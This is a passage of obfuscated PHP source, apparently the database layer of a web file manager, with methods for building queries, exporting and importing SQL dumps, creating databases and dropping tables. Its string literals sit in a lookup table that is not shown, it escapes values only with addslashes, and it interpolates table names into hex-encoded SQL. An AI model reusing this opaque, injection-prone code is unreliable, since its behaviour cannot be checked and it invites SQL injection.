$¾´À‘Ï[$¸šÚÈ¯ç[285]] : array())); } public function select($ŠĞêŠˆ = array()) { $·Ç‹ã¹ =& $_SERVER[ñˆ‹ß¿÷]; $this->model = $ŠĞêŠˆ[$·Ç‹ã¹[281]]; $ŠØÂÙ„¦ = $this->buildSelectSql($ŠĞêŠˆ); $ú²¡÷ˆĞ = isset($ŠĞêŠˆ[$·Ç‹ã¹[349]]) ? $ŠĞêŠˆ[$·Ç‹ã¹[349]] : !1; if ($ú²¡÷ˆĞ) { $‰ ¾í­¥ = is_string($ú²¡÷ˆĞ[$·Ç‹ã¹[94]]) ? $ú²¡÷ˆĞ[$·Ç‹ã¹[94]] : $·Ç‹ã¹[1050] . md5($ŠØÂÙ„¦); $ÒÑÒËº˜ = think_cache($‰ ¾í­¥, $·Ç‹ã¹[12], $ú²¡÷ˆĞ); if (!1 !== $ÒÑÒËº˜) { return $ÒÑÒËº˜; } } $Á°Øˆ÷” = $this->query($ŠØÂÙ„¦, $this->parseBind(!empty($ŠĞêŠˆ[$·Ç‹ã¹[285]]) ? $ŠĞêŠˆ[$·Ç‹ã¹[285]] : array())); if ($ú²¡÷ˆĞ && !1 !== $Á°Øˆ÷”) { think_cache($‰ ¾í­¥, $Á°Øˆ÷”, $ú²¡÷ˆĞ); } return $Á°Øˆ÷”; } public function buildSelectSql($Ç¢–¹¨ã = array()) { $„ìØÔŞŠ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($Ç¢–¹¨ã[$„ìØÔŞŠ[353]])) { if (strpos($Ç¢–¹¨ã[$„ìØÔŞŠ[353]], $„ìØÔŞŠ[50])) { list($ùØÙ£„¶, $Ô…§¼ìÖ) = explode($„ìØÔŞŠ[50], $Ç¢–¹¨ã[$„ìØÔŞŠ[353]]); } else { $ùØÙ£„¶ = $Ç¢–¹¨ã[$„ìØÔŞŠ[353]]; } $ùØÙ£„¶ = $ùØÙ£„¶ ? $ùØÙ£„¶ : 1; $Ô…§¼ìÖ = isset($Ô…§¼ìÖ) ? $Ô…§¼ìÖ : (is_numeric($Ç¢–¹¨ã[$„ìØÔŞŠ[292]]) ? $Ç¢–¹¨ã[$„ìØÔŞŠ[292]] : 20); $ ö²Œìä = $Ô…§¼ìÖ * ((int) $ùØÙ£„¶ - 1); $Ç¢–¹¨ã[$„ìØÔŞŠ[292]] = $ ö²Œìä . $„ìØÔŞŠ[50] . $Ô…§¼ìÖ; } if (think_config($„ìØÔŞŠ[1051])) { $Õçã¦Õª = $„ìØÔŞŠ[1052] . md5(serialize($Ç¢–¹¨ã)); $ºÙ·ŠÁÇ = think_cache($Õçã¦Õª); if ($ºÙ·ŠÁÇ) { return $ºÙ·ŠÁÇ; } } $š¨ŠÂÓî = $this->parseSql($this->selectSql, $Ç¢–¹¨ã); $š¨ŠÂÓî .= $this->parseLock(isset($Ç¢–¹¨ã[$„ìØÔŞŠ[850]]) ? $Ç¢–¹¨ã[$„ìØÔŞŠ[850]] : !1); if (isset($Õçã¦Õª)) { think_cache($Õçã¦Õª, $š¨ŠÂÓî); } return $š¨ŠÂÓî; } public function parseSql($ãõ”õ˜Ç, $È—¬À± = array()) { $¶ã«ù±À =& $_SERVER[ñˆ‹ß¿÷]; $ãõ”õ˜Ç = str_replace(array($¶ã«ù±À[1053], $¶ã«ù±À[1054], $¶ã«ù±À[1055], $¶ã«ù±À[1056], $¶ã«ù±À[1057], $¶ã«ù±À[1058], $¶ã«ù±À[1059], $¶ã«ù±À[1060], $¶ã«ù±À[1061], $¶ã«ù±À[1062], $¶ã«ù±À[1063]), array($this->parseTable("{$È—¬À±[$¶ã«ù±À[279]]}"), $this->parseDistinct(isset($È—¬À±[$¶ã«ù±À[1064]]) ? $È—¬À±[$¶ã«ù±À[1064]] : !1), $this->parseField(!empty($È—¬À±[$¶ã«ù±À[273]]) ? $È—¬À±[$¶ã«ù±À[273]] : $¶ã«ù±À[188]), $this->parseJoin(!empty($È—¬À±[$¶ã«ù±À[282]]) ? $È—¬À±[$¶ã«ù±À[282]] : $¶ã«ù±À[12]), $this->parseWhere(!empty($È—¬À±[$¶ã«ù±À[275]]) ? $È—¬À±[$¶ã«ù±À[275]] : $¶ã«ù±À[12]), $this->parseGroup(!empty($È—¬À±[$¶ã«ù±À[515]]) ? $È—¬À±[$¶ã«ù±À[515]] : $¶ã«ù±À[12]), $this->parseHaving(!empty($È—¬À±[$¶ã«ù±À[1065]]) ? $È—¬À±[$¶ã«ù±À[1065]] : $¶ã«ù±À[12]), $this->parseOrder(!empty($È—¬À±[$¶ã«ù±À[365]]) ? $È—¬À±[$¶ã«ù±À[365]] : $¶ã«ù±À[12]), $this->parseLimit(!empty($È—¬À±[$¶ã«ù±À[292]]) ? $È—¬À±[$¶ã«ù±À[292]] : $¶ã«ù±À[12]), $this->parseUnion(!empty($È—¬À±[$¶ã«ù±À[347]]) ? $È—¬À±[$¶ã«ù±À[347]] : $¶ã«ù±À[12]), $this->parseComment(!empty($È—¬À±[$¶ã«ù±À[354]]) ? $È—¬À±[$¶ã«ù±À[354]] : $¶ã«ù±À[12])), $ãõ”õ˜Ç); return $ãõ”õ˜Ç; } public function getLastSql($îüêóÊ· = '') { return $îüêóÊ· ? $this->modelSql[$îüêóÊ·] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($œó˜âÚ¤) { return addslashes($œó˜âÚ¤); } public function setModel($Œù¥Â‡é) { $this->model = $Œù¥Â‡é; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Æòİàíš = array()) { $éšÃóÇŠ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($Æòİàíš)) { $Æòİàíš = $GLOBALS[$éšÃóÇŠ[6]][$éšÃóÇŠ[21]]; } $this->database = $Æòİàíš; } public function model($Ôî¦³œ¶ = '') { return new ModelBase($Ôî¦³œ¶, $_SERVER[ñˆ‹ß¿÷][12], $this->database); } public function db($À‘È¾ªñ = false) { $éŠË±‹ =& $_SERVER[ñˆ‹ß¿÷]; $ÓË•à³Ç = array_change_key_case($this->database); if ($this->dbType() == $éŠË±‹[13] || !$À‘È¾ªñ) { return $this->model()->db(); } $½ í¦€à = $ÓË•à³Ç[$éŠË±‹[979]]; $ÓË•à³Ç[$éŠË±‹[979]] = $éŠË±‹[12]; if ($ÓË•à³Ç[$éŠË±‹[974]] == $éŠË±‹[971]) { $áşÌş¿Ê = $ÓË•à³Ç[$éŠË±‹[980]]; $ÓË•à³Ç[$éŠË±‹[980]] = substr($áşÌş¿Ê, 0, strrpos($áşÌş¿Ê, $éŠË±‹[1066])); } $this->database = $ÓË•à³Ç; $É®ãö¡Œ = $this->model()->db(); try { $¯ñó­‘Ã = $É®ãö¡Œ->execute("\163\150\x6f\167\x20\144\141\164\141\x62\141\163\x65\x73\x20\154\x69\x6b\145\x20\47{$½ í¦€à}\47"); } catch (Exception $‹÷“Êı¯) { } if (!$¯ñó­‘Ã) { $É®ãö¡Œ->execute("\x63\162\145\141\164\x65\40\144\141\x74\x61\x62\141\x73\145\40\x60{$½ í¦€à}\140"); } $ÓË•à³Ç[$éŠË±‹[979]] = $½ í¦€à; if ($ÓË•à³Ç[$éŠË±‹[974]] == $éŠË±‹[971]) { $ÓË•à³Ç[$éŠË±‹[980]] .= $éŠË±‹[1066] . $½ í¦€à; } $this->database = $ÓË•à³Ç; $É®ãö¡Œ->execute("\165\x73\145\40\140{$½ í¦€à}\x60"); return $É®ãö¡Œ; } public function createTable($Ñ“¾¼±ˆ, &$¢úĞ×) { $µú›Ó‹š =& $_SERVER[ñˆ‹ß¿÷]; if (!IO::exist($Ñ“¾¼±ˆ)) { ActionCall($µú›Ó‹š[1067], !0, 0); show_json(LNG($µú›Ó‹š[1068]), !1); } $ì«†úƒ  = $this->model()->db(); $ëÂ¯–µ = sqlSplit(IO::getContent($Ñ“¾¼±ˆ)); foreach ($ëÂ¯–µ as $´À„É¹ä) { $Ò†ùÕìˆ = stripos($´À„É¹ä, $µú›Ó‹š[1069]) === 0; if ($Ò†ùÕìˆ) { $¢úĞ×->task[$µú›Ó‹š[793]] += 1; } $ì«†úƒ ->execute($´À„É¹ä); if ($Ò†ùÕìˆ) { preg_match($µú›Ó‹š[1070], $´À„É¹ä, $Áê®áç); $¢úĞ×->task[$µú›Ó‹š[1071]] = $Áê®áç[1]; $¢úĞ×->update(1); } } } public function insertTable($Ò†å°…, &$ü¾¶Ğ€í) { $íÎ€£Ê¢ =& $_SERVER[ñˆ‹ß¿÷]; $Âƒ¦»™ö = $this->model()->db(); $¬àéõ°œ = $úû‹¡Î ? array($úû‹¡Î) : $Âƒ¦»™ö->getTables(); foreach ($Ò†å°… as $’©İ·ê) { $úû‹¡Î = basename($’©İ·ê, $íÎ€£Ê¢[795]); if (!in_array($úû‹¡Î, $¬àéõ°œ)) { continue; } $ü¾¶Ğ€í->task[$íÎ€£Ê¢[1071]] = $úû‹¡Î; if (get_filesize($’©İ·ê) == 0) { continue; } $—ãèİŞç = $this->sqlToDb($’©İ·ê, $ü¾¶Ğ€í); if (!$—ãèİŞç) { ActionCall($íÎ€£Ê¢[1067], !0, 0); show_json(LNG($íÎ€£Ê¢[1072]) . "\133{$úû‹¡Î}\x5d", !1); } } } public function sqlFromDb($‡Ôèô¥Ñ, $Ìš—êİ¡, &$ŸĞçü¤ø, $Œ®€Í•Ç = '') { if ($ŸĞçü¤ø) { $ŸĞçü¤ø->task[$_SERVER[ñˆ‹ß¿÷][1071]] = $‡Ôèô¥Ñ; } $¬Å‰ñãî = $this->model($‡Ôèô¥Ñ); $ä­¶¼»Õ = 0; $™„ø¥Ù² = 0; $Ç±…óöâ = 10000; $î®ªóá¦ = fopen($Ìš—êİ¡, $_SERVER[ñˆ‹ß¿÷][1073]); $©ãÎÑñŸ = $¬Å‰ñãî->getPk(); $¿Ú¹ÛœÅ = $¬Å‰ñãî->getDbFields(); $îÖ†£ì = $_SERVER[ñˆ‹ß¿÷][12]; if ($GLOBALS[$_SERVER[ñˆ‹ß¿÷][794]] && in_array($‡Ôèô¥Ñ, array($_SERVER[ñˆ‹ß¿÷][1074], $_SERVER[ñˆ‹ß¿÷][1075]))) { $îÖ†£ì = $‡Ôèô¥Ñ; } do { $ÍŞß×¸ = array($©ãÎÑñŸ => array($_SERVER[ñˆ‹ß¿÷][1021], $™„ø¥Ù²)); $ú±‹Ô¢ = $¬Å‰ñãî->where($ÍŞß×¸)->field($¿Ú¹ÛœÅ)->order($©ãÎÑñŸ . $_SERVER[ñˆ‹ß¿÷][1076])->limit($Ç±…óöâ)->select(); $ú±‹Ô¢ = !empty($ú±‹Ô¢) ? $ú±‹Ô¢ : array(); if (!($¨àğÖñ = count($ú±‹Ô¢))) { break; } $Í Š†êá = end($ú±‹Ô¢); $™„ø¥Ù² = $Í Š†êá[$©ãÎÑñŸ]; $¬Ìı”°· = array(); foreach ($ú±‹Ô¢ as $ùôö÷Öª) { if ($îÖ†£ì) { if ($‡Ôèô¥Ñ == $_SERVER[ñˆ‹ß¿÷][1074]) { if ($ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][33]] == $_SERVER[ñˆ‹ß¿÷][1077]) { $§ÄæÜÌÈ = json_decode($ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][374]], !0); if ($§ÄæÜÌÈ[$_SERVER[ñˆ‹ß¿÷][32]] == $GLOBALS[$_SERVER[ñˆ‹ß¿÷][794]] && $§ÄæÜÌÈ[$_SERVER[ñˆ‹ß¿÷][757]] != 1) { continue; } } } else { if ($ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][33]] == $_SERVER[ñˆ‹ß¿÷][1078] && $ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][94]] == $_SERVER[ñˆ‹ß¿÷][786]) { continue; } } } if ($Œ®€Í•Ç) { $ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][84]] = "\173\x69\x6f\x3a{$Œ®€Í•Ç}\x7d" . substr($ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][84]], strlen("\173\x69\x6f\x3a{$ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][824]]}\x7d")); $ùôö÷Öª[$_SERVER[ñˆ‹ß¿÷][824]] = $Œ®€Í•Ç; } $¬Ìı”°·[] = $_SERVER[ñˆ‹ß¿÷][1079] . $this->sqlEncode($ùôö÷Öª) . $_SERVER[ñˆ‹ß¿÷][1080]; } $–°ùÎ¢³ = "\x49\116\123\105\x52\x54\40\111\116\124\x4f\x20\140{$‡Ôèô¥Ñ}\x60\40\50\140" . implode($_SERVER[ñˆ‹ß¿÷][1081], $¿Ú¹ÛœÅ) . $_SERVER[ñˆ‹ß¿÷][1082]; fwrite($î®ªóá¦, $–°ùÎ¢³ . implode($_SERVER[ñˆ‹ß¿÷][1083], $¬Ìı”°·) . $_SERVER[ñˆ‹ß¿÷][71] . PHP_EOL); $ä­¶¼»Õ += $¨àğÖñ; if ($ŸĞçü¤ø) { $ŸĞçü¤ø->update($¨àğÖñ); } } while ($Ç±…óöâ == $¨àğÖñ); fclose($î®ªóá¦); return $ä­¶¼»Õ; } public function sqlToDb($àşÎàææ, &$©ÔÕ·¨©) { $•„š½º =& $_SERVER[ñˆ‹ß¿÷]; $Õ•–ãğ½ = $this->model()->db(); $ÛË¹¬Ã = @fopen($àşÎàææ, $•„š½º[1084]); if (!$ÛË¹¬Ã) { return !1; } $øÊáĞüÂ = 0; $ÙàŠÀĞŠ = $•„š½º[12]; $şˆÉ¼õ = array(); $ ‰¸®² = $this->dbType(); $°œ§¥š = $ ‰¸®² == $•„š½º[13] ? 500 : 2000; $¼ÁÁ«ã¡ = basename($àşÎàææ, $•„š½º[795]); $«ÓİÛû· = 0; $ÍâØÀ˜ = 4194304 - 104858; $ºô…Ë£Á = 1000000 - 104858; while (!feof($ÛË¹¬Ã)) { $›ä±ˆ†Ï = trim(fgets($ÛË¹¬Ã)); if (!$›ä±ˆ†Ï) { continue; } $ÔÍú×Ú = $this->sqlDecode($›ä±ˆ†Ï, $ ‰¸®², $¼ÁÁ«ã¡); if (stripos($ÔÍú×Ú, $•„š½º[355]) === 0) { if (!$ÙàŠÀĞŠ) { $ÙàŠÀĞŠ = $ÔÍú×Ú . $•„š½º[53]; } continue; } if ($©ÔÕ·¨©) { $©ÔÕ·¨©->task[$•„š½º[793]] += 1; } $øÊáĞüÂ++; $şˆÉ¼õ[] = rtrim(rtrim(trim($ÔÍú×Ú), $•„š½º[50]), $•„š½º[71]); $íÜ•ñ±¬ = null; $ìú‹‹Ò = strlen($ÔÍú×Ú); $«ÓİÛû· += $ìú‹‹Ò; if ($«ÓİÛû· >= ($°œ§¥š == 500 ? $ºô…Ë£Á : $ÍâØÀ˜)) { $íÜ•ñ±¬ = array_pop($şˆÉ¼õ); if ($øÊáĞüÂ > 1) { $øÊáĞüÂ--; } } if ($øÊáĞüÂ >= $°œ§¥š || $íÜ•ñ±¬) { $ÔÍú×Ú = $ÙàŠÀĞŠ . implode($•„š½º[50], $şˆÉ¼õ); if (!$Õ•–ãğ½->execute($ÔÍú×Ú)) { return !1; } if ($©ÔÕ·¨©) { $©ÔÕ·¨©->update($øÊáĞüÂ); } $şˆÉ¼õ = array(); $øÊáĞüÂ = 0; $«ÓİÛû· = 0; if ($íÜ•ñ±¬) { $şˆÉ¼õ = array($íÜ•ñ±¬); $øÊáĞüÂ = 1; $«ÓİÛû· = $ìú‹‹Ò; } } } fclose($ÛË¹¬Ã); if (!empty($şˆÉ¼õ)) { $ÔÍú×Ú = $ÙàŠÀĞŠ . implode($•„š½º[50], $şˆÉ¼õ); if (!$Õ•–ãğ½->execute($ÔÍú×Ú)) { return !1; } if ($©ÔÕ·¨©) { $©ÔÕ·¨©->update($øÊáĞüÂ); } } return !0; } public function dropTable($’ïÔ«†¸ = null) { $ö‘ìûØ‹ = $this->model()->db(); $ì¼Š€€ = $’ïÔ«†¸ ? array($’ïÔ«†¸) : $ö‘ìûØ‹->getTables(); if (!$ì¼Š€€) { return; } foreach ($ì¼Š€€ as $’ïÔ«†¸) { if ($’ïÔ«†¸) { $’ïÔ«†¸ = strtolower($’ïÔ«†¸); } else { continue; } $ö‘ìûØ‹->execute("\144\x72\157\160\x20\164\141\x62\x6c\145\x20\x69\x66\40\x65\x78\151\163\164\163\40\140{$’ïÔ«†¸}\140"); } } private function sqlEncode($’˜¡ÑÊÇ) { $Ó´…ùâ =& $_SERVER[ñˆ‹ß¿÷]; $à©Í§á¼ = array(); foreach ($’˜¡ÑÊÇ as $ÛŒìµØ) { if (is_array($ÛŒìµØ)) { $ÛŒìµØ = json_encode_force($ÛŒìµØ); } $ÛŒìµØ = addslashes($ÛŒìµØ); $ÛŒìµØ = str_replace(array($Ó´…ùâ[1085], $Ó´…ùâ[231]), array($Ó´…ùâ[1086], $Ó´…ùâ[1087]), $ÛŒìµØ); $à©Í§á¼[] = str_replace($Ó´…ùâ[58], $Ó´…ùâ[1088], $ÛŒìµØ); } return $Ó´…ùâ[58] . implode($Ó´…ùâ[1089], $à©Í§á¼) . $Ó´…ùâ[58]; } private function sqlDecode($ÍæÍ„¨˜, $ê¾ˆé÷, $„¢†›Õù = '') { $ù¬ö®õ¢ =& $_SERVER[ñˆ‹ß¿÷]; $ÍæÍ„¨˜ = str_replace(array($ù¬ö®õ¢[1086], $ù¬ö®õ¢[1087]), array($ù¬ö®õ¢[1085], $ù¬ö®õ¢[231]), $ÍæÍ„¨˜); if ($ê¾ˆé÷ == $ù¬ö®õ¢[13]) { return $„¢†›Õù != $ù¬ö®õ¢[1090] ? stripslashes($ÍæÍ„¨˜) : $ÍæÍ„¨˜; } if ($„¢†›Õù == $ù¬ö®õ¢[1090]) { $ÍæÍ„¨˜ = str_replace($ù¬ö®õ¢[1091], $ù¬ö®õ¢[118], stripslashes($ÍæÍ„¨˜)); } return $ÍæÍ„¨˜; } public function getSqlFile($—Ø³Â © = '') { $…»ÈçÕÏ =& $_SERVER[ñˆ‹ß¿÷]; $²Œ­ˆ«Ç = $this->dbType(!0); $³°³ÑÌ = CONTROLLER_DIR . "\151\x6e\x73\164\x61\x6c\x6c\57\144\x61\164\x61\x2f{$²Œ­ˆ«Ç}\56\x73\161\154"; $‰ø•ˆ¬ = file_get_contents($³°³ÑÌ); $úñ“Ïöç = $…»ÈçÕÏ[1092] . ($²Œ­ˆ«Ç == $…»ÈçÕÏ[811] ? $…»ÈçÕÏ[1093] : $…»ÈçÕÏ[1094]) . $…»ÈçÕÏ[1095]; preg_match_all($úñ“Ïöç, $‰ø•ˆ¬, $…¤›…½‘); $äæ£Ëê = $…¤›…½‘[1]; $µÀËï“ = $this->model()->db(); $ˆÚè¥ = $µÀËï“->getTables(); $ÙÌŸ–„î = TEMP_FILES . $…»ÈçÕÏ[1096] . date($…»ÈçÕÏ[758]) . $…»ÈçÕÏ[8]; del_dir($ÙÌŸ–„î); mk_dir($ÙÌŸ–„î); $çÎ¢ƒ = $ÙÌŸ–„î . $…»ÈçÕÏ[1097]; $ÖÄ÷ºÓÒ = $ÙÌŸ–„î . $…»ÈçÕÏ[1098]; $øû’ÄÖ = $²Œ­ˆ«Ç == $…»ÈçÕÏ[13] ? $…»ÈçÕÏ[811] : $…»ÈçÕÏ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\154\57\x64\141\x74\x61\57{$øû’ÄÖ}\56\163\x71\x6c", $ÙÌŸ–„î); @touch($ÙÌŸ–„î . $²Œ­ˆ«Ç . $…»ÈçÕÏ[795]); $íüš¯™ = fopen($çÎ¢ƒ, $…»ÈçÕÏ[1073]); $„ôÏ© = fopen($ÖÄ÷ºÓÒ, $…»ÈçÕÏ[1073]); if ($²Œ­ˆ«Ç == $…»ÈçÕÏ[13]) { $ˆÚè¥ = array_diff($ˆÚè¥, array($…»ÈçÕÏ[791], $…»ÈçÕÏ[792])); $Â‰öÍÄø = array($…»ÈçÕÏ[1099], $…»ÈçÕÏ[1100], $…»ÈçÕÏ[1101]); fwrite($„ôÏ©, implode(PHP_EOL, $Â‰öÍÄø) . PHP_EOL . PHP_EOL); foreach ($ˆÚè¥ as $ÍØª¢ó–) { $éÊíª¥‰ = $this->sqlFromSqlite($ÍØª¢ó–); if (!$éÊíª¥‰[$…»ÈçÕÏ[13]]) { continue; } fwrite($„ôÏ©, $éÊíª¥‰[$…»ÈçÕÏ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÍØª¢ó–, $äæ£Ëê)) { fwrite($íüš¯™, $éÊíª¥‰[$…»ÈçÕÏ[811]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ˆÚè¥ as $ÍØª¢ó–) { $éÊíª¥‰ = $this->sqlFromMysql($ÍØª¢ó–); if (!$éÊíª¥‰[$…»ÈçÕÏ[811]]) { continue; } fwrite($íüš¯™, $éÊíª¥‰[$…»ÈçÕÏ[811]] . PHP_EOL . PHP_EOL); if (!in_array($ÍØª¢ó–, $äæ£Ëê)) { fwrite($„ôÏ©, $éÊíª¥‰[$…»ÈçÕÏ[13]] . PHP_EOL . PHP_EOL); } } } fclose($íüš¯™); fclose($„ôÏ©); $‰ø•ˆ¬ = array($…»ÈçÕÏ[811] => $çÎ¢ƒ, $…»ÈçÕÏ[13] => $ÖÄ÷ºÓÒ); return $—Ø³Â © ? $‰ø•ˆ¬[$—Ø³Â ©] : $‰ø•ˆ¬; } public function dbType($²‚Şê…ü = false) { $½¬Şã =& $_SERVER[ñˆ‹ß¿÷]; $ŒàÙ¸ÖÈ = $²‚Şê…ü ? $GLOBALS[$½¬Şã[6]][$½¬Şã[21]] : $this->database; $ŒàÙ¸ÖÈ = array_change_key_case($ŒàÙ¸ÖÈ); $šÌÓæ™ı = $ŒàÙ¸ÖÈ[$½¬Şã[974]]; if ($šÌÓæ™ı == $½¬Şã[971]) { $¿Æî… = explode($½¬Şã[4], $ŒàÙ¸ÖÈ[$½¬Şã[980]]); $šÌÓæ™ı = $¿Æî…[0]; } $’Ÿäàó¡ = array($½¬Şã[1102] => $½¬Şã[13], $½¬Şã[919] => $½¬Şã[811]); if (isset($’Ÿäàó¡[$šÌÓæ™ı])) { $šÌÓæ™ı = $’Ÿäàó¡[$šÌÓæ™ı]; } return $šÌÓæ™ı; } public function sqlFromMysql($ÏİÊÕö³, $û‡¿ÇñË = '') { $¬ÖàÔ€ =& $_SERVER[ñˆ‹ß¿÷]; $Ö¸¶áàô = $this->model()->db(); $§ø‹áØ› = $Ö¸¶áàô->query($¬ÖàÔ€[1103] . $ÏİÊÕö³ . $¬ÖàÔ€[385]); if (!$§ø‹áØ› || !$§ø‹áØ›[0]) { return !1; } $–Îá°µì = _get($§ø‹áØ›[0], $¬ÖàÔ€[1104], $¬ÖàÔ€[12]); if (!$–Îá°µì) { return !1; } $„¨Â¿’­ = "\104\122\x4f\x50\x20\124\101\x42\114\105\40\111\106\x20\105\130\x49\x53\x54\123\x20\x60{$ÏİÊÕö³}\140\x3b" . PHP_EOL . $–Îá°µì . $¬ÖàÔ€[71]; if ($û‡¿ÇñË && $û‡¿ÇñË == $¬ÖàÔ€[811]) { return $„¨Â¿’­; } $Òïù·óø = array_change_key_case($GLOBALS[$¬ÖàÔ€[6]][$¬ÖàÔ€[21]]); $êğãìŞ¼ = $Òïù·óø[$¬ÖàÔ€[979]]; $í¼îÔå’ = $¬ÖàÔ€[1105] . $êğãìŞ¼ . $¬ÖàÔ€[1106] . $ÏİÊÕö³ . $¬ÖàÔ€[58]; $ˆ‰®úš = $¬ÖàÔ€[1107] . $ÏİÊÕö³ . $¬ÖàÔ€[907]; $¨“É¬Ñ’ = $Ö¸¶áàô->query($í¼îÔå’); if (empty($¨“É¬Ñ’)) { $ééÂ¸ìó = array($¬ÖàÔ€[811] => $¬ÖàÔ€[12], $¬ÖàÔ€[13] => $¬ÖàÔ€[12]); return $û‡¿ÇñË ? $ééÂ¸ìó[$û‡¿ÇñË] : $ééÂ¸ìó; } $©˜İè¿ = $Ö¸¶áàô->query($ˆ‰®úš); $–ôâ¨¹ = $¬ÖàÔ€[12]; $¦¦ô„î– = array(); foreach ($©˜İè¿ as $˜à àíğ) { if (!$–ôâ¨¹ && $˜à àíğ[$¬ÖàÔ€[1108]] == $¬ÖàÔ€[1109]) { $–ôâ¨¹ = $˜à àíğ[$¬ÖàÔ€[1110]]; } if (isset($¦¦ô„î–[$˜à àíğ[$¬ÖàÔ€[1108]]])) { $¦¦ô„î–[$˜à àíğ[$¬ÖàÔ€[1108]]][$¬ÖàÔ€[1111]][] = $˜à àíğ[$¬ÖàÔ€[1110]]; continue; } $¦¦ô„î–[$˜à àíğ[$¬ÖàÔ€[1108]]] = array($¬ÖàÔ€[1112] => $˜à àíğ[$¬ÖàÔ€[1108]], $¬ÖàÔ€[1111] => array($˜à àíğ[$¬ÖàÔ€[1110]]), $¬ÖàÔ€[1113] => $˜à àíğ[$¬ÖàÔ€[1114]] == $¬ÖàÔ€[88] ? 0 : 1); } $ôÂ»¸Ôˆ = array(); foreach ($¦¦ô„î– as $˜à àíğ) { $Ä×Ê€ = $˜à àíğ[$¬ÖàÔ€[1112]] == $¬ÖàÔ€[1109]; $¹¾óØ¡Î = array($¬ÖàÔ€[1115], $˜à àíğ[$¬ÖàÔ€[1113]] == $¬ÖàÔ€[88] && !$Ä×Ê€ ? $¬ÖàÔ€[1116] : $¬ÖàÔ€[12], $¬ÖàÔ€[1117], $¬ÖàÔ€[1118] . $ÏİÊÕö³ . $¬ÖàÔ€[11] . ($Ä×Ê€ ? $¬ÖàÔ€[1119] : $˜à àíğ[$¬ÖàÔ€[1112]]) . $¬ÖàÔ€[118], $¬ÖàÔ€[1120], $¬ÖàÔ€[118] . $ÏİÊÕö³ . $¬ÖàÔ€[118], $¬ÖàÔ€[1121] . implode($¬ÖàÔ€[1122], $˜à àíğ[$¬ÖàÔ€[1111]]) . $¬ÖàÔ€[1123]); $ôÂ»¸Ôˆ[] = implode($¬ÖàÔ€[53], $¹¾óØ¡Î) . $¬ÖàÔ€[71]; } $Åêâ•ã˜ = array(); $«Ñøëëí = array($¬ÖàÔ€[1124] => $¬ÖàÔ€[1125], $¬ÖàÔ€[1125] => $¬ÖàÔ€[1125], $¬ÖàÔ€[288] => $¬ÖàÔ€[315], $¬ÖàÔ€[287] => $¬ÖàÔ€[315]); foreach ($¨“É¬Ñ’ as $˜à àíğ) { $¹¾óØ¡Î = array($¬ÖàÔ€[118] . $˜à àíğ[$¬ÖàÔ€[1126]] . $¬ÖàÔ€[118], isset($«Ñøëëí[$˜à àíğ[$¬ÖàÔ€[1127]]]) ? $«Ñøëëí[$˜à àíğ[$¬ÖàÔ€[1127]]] : $˜à àíğ[$¬ÖàÔ€[1128]], $˜à àíğ[$¬ÖàÔ€[1129]] == $¬ÖàÔ€[905] ? $¬ÖàÔ€[1130] : $¬ÖàÔ€[1131], $˜à àíğ[$¬ÖàÔ€[1126]] == $–ôâ¨¹ ? $¬ÖàÔ€[1132] : $¬ÖàÔ€[12], $˜à àíğ[$¬ÖàÔ€[956]] ? strtoupper(str_replace($¬ÖàÔ€[11], $¬ÖàÔ€[12], $˜à àíğ[$¬ÖàÔ€[956]])) : $¬ÖàÔ€[12]); $Åêâ•ã˜[] = trim(implode($¬ÖàÔ€[53], $¹¾óØ¡Î)); } $Ò¹ôò¢ = array($¬ÖàÔ€[1133] . $ÏİÊÕö³ . $¬ÖàÔ€[1134], $¬ÖàÔ€[1135] . $ÏİÊÕö³ . $¬ÖàÔ€[1136], implode($¬ÖàÔ€[50] . PHP_EOL, $Åêâ•ã˜), $¬ÖàÔ€[953]); $Õ÷î×›¡ = implode(PHP_EOL, array_merge($Ò¹ôò¢, $ôÂ»¸Ôˆ)); if ($û‡¿ÇñË && $û‡¿ÇñË == $¬ÖàÔ€[13]) { return $Õ÷î×›¡; } $ééÂ¸ìó = array($¬ÖàÔ€[811] => $„¨Â¿’­, $¬ÖàÔ€[13] => $Õ÷î×›¡); return $û‡¿ÇñË ? $ééÂ¸ìó[$û‡¿ÇñË] : $ééÂ¸ìó; } public function sqlFromSqlite($ø¡Ğê”», $ìŒë–´ = '') { $üµê“å‡ =& $_SERVER[ñˆ‹ß¿÷]; $¹¢ì°¢Ù = $this->model()->db(); $À¥¼âú = "\120\x52\x41\x47\115\101\x20\x54\101\x42\114\x45\x5f\x49\116\x46\117\x20\x28\47{$ø¡Ğê”»}\47\x29"; $ü‡•á„ö = "\x53\x45\x4c\105\103\124\40\x2a\x20\106\122\117\115\x20\163\x71\x6c\x69\164\x65\x5f\155\x61\x73\x74\145\162\x20\127\110\x45\122\105\x20\164\142\154\x5f\156\141\x6d\145\40\x3d\x20\x27{$ø¡Ğê”»}\47"; $èÜˆÔšÈ = $¹¢ì°¢Ù->query($À¥¼âú); if (empty($èÜˆÔšÈ)) { $ˆ¿×”óæ = array($üµê“å‡[811] => $üµê“å‡[12], $üµê“å‡[13] => $üµê“å‡[12]); return $ìŒë–´ ? $ˆ¿×”óæ[$ìŒë–´] : $ˆ¿×”óæ; } $¡ÚÍ™ã = $¹¢ì°¢Ù->query($ü‡•á„ö); $ëÑëƒ¤ï = $–Ÿş¾ = array(); foreach ($¡ÚÍ™ã as $Úİœ¥’î) { if ($Úİœ¥’î[$üµê“å‡[33]] == $üµê“å‡[279]) { $ëÑëƒ¤ï[] = $Úİœ¥’î[$üµê“å‡[1137]]; } else { $–Ÿş¾[$Úİœ¥’î[$üµê“å‡[32]]] = $Úİœ¥’î[$üµê“å‡[1137]]; } } $ƒ¢¾‰ˆŞ = array_merge(array($üµê“å‡[1133] . $ø¡Ğê”» . $üµê“å‡[118]), $ëÑëƒ¤ï, 